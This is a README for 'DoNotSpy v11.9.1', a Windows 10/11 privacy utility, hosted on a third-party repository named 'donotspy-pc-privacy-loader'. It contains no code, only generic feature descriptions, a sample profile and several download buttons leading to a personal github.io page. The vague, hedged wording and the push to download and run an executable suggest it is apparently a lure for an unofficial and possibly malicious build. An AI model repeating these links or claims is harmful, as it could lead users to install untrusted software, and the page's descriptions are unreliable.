# DoNotSpy v11.9.1 - privacy tool 2026

> **DoNotSpy is a Windows 10/11 x64 privacy utility built to cut down telemetry, adjust system behavior, and apply privacy-oriented profiles in version 11.9.1.**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v11.9.1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevinmoore1990/donotspy-pc-privacy-loader?style=flat-square)](https://github.com/kevinmoore1990/donotspy-pc-privacy-loader)

---

<p align="center">
  <a href="https://kevinmoore1990.github.io/donotspy-pc-privacy-loader/">
    <img src="https://img.shields.io/badge/Download-DoNotSpy%20Latest-brightgreen?style=for-the-badge" alt="Download DoNotSpy">
  </a>
</p>

> **[Direct Download - DoNotSpy v11.9.1](https://kevinmoore1990.github.io/donotspy-pc-privacy-loader/)**

---

[Download Latest Build](https://kevinmoore1990.github.io/donotspy-pc-privacy-loader/)

---

## What DoNotSpy Does

DoNotSpy is aimed at people who want tighter control over Windows privacy settings without having to hunt through every option manually. It centers on telemetry suppression, tracking-related changes, and system-level tweaks that can be deployed through prebuilt privacy profiles or handled one setting at a time.

The utility targets Windows 10 and 11 x64 systems and suits a wide range of users, including home users, PC builders, and advanced admins who manage their own environments. Before making changes, it can create restore snapshots, giving you a practical way to undo selected adjustments if you later want to revisit them.

---

## Capabilities

- Reduces Windows telemetry and data collection
- Changes or turns off selected background services
- Uses one-click privacy templates for quicker configuration
- Creates restore snapshots before modifications are applied
- Supports command-line profile application and reporting
- Adds Edge and Chromium privacy tweaks
- Works with privacy profiles for repeatable setups
- Simplifies common Windows hardening workflows

---

## Setup

1. Download or clone the repository contents.
2. Place the build in a folder on a Windows 10/11 x64 system.
3. Launch the included executable or open the tool from your chosen build location.

If you are using a command-line workflow, start by loading a privacy profile and then review the generated report before applying further changes.

---

## How to Use It

A common flow is to choose a privacy profile, check the available tweaks, and then apply only the changes you actually want.

Example workflow:

1. Open DoNotSpy.
2. Select a privacy template or pick individual options.
3. Create a restore snapshot before applying changes.
4. Apply the selected configuration.
5. Review the report or summary after the run.

For command-line usage, apply a saved profile and generate a report from the same session when supported by your build.

---

## Configuration

Settings are typically controlled through privacy profiles and the options you select within the app.

If your build includes profile files or saved presets, keep them in the tool's working directory or the location used by your command-line workflow.

Example profile-style layout:

    profile:
      name: privacy-baseline
      telemetry: blocked
      background_services: adjusted
      browser_tweaks: enabled
      snapshot_before_apply: true

---

## System Requirements

- Windows 10 or Windows 11
- x64 architecture
- Local permissions appropriate for system setting changes
- Enough space for snapshots, reports, and profile files
- A compatible build of the tool for your environment

---

## FAQ

**How do I update to a newer version?**  
Download the latest build from the project link and replace the existing files with the new release package.

**Can I revert changes?**  
Yes. The tool creates restore snapshots before applying changes, which helps when you need to roll back selected settings.

**Where are the privacy settings stored?**  
They are managed through the tool's profiles, selected options, and any saved configuration files included with your build.

**What if a change does not apply?**  
Check that you are using a supported Windows 10/11 x64 system and that the session has the permissions needed to adjust the selected settings.

**Does it support browser tweaks?**  
Yes. The feature set includes Edge and Chromium privacy adjustments.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
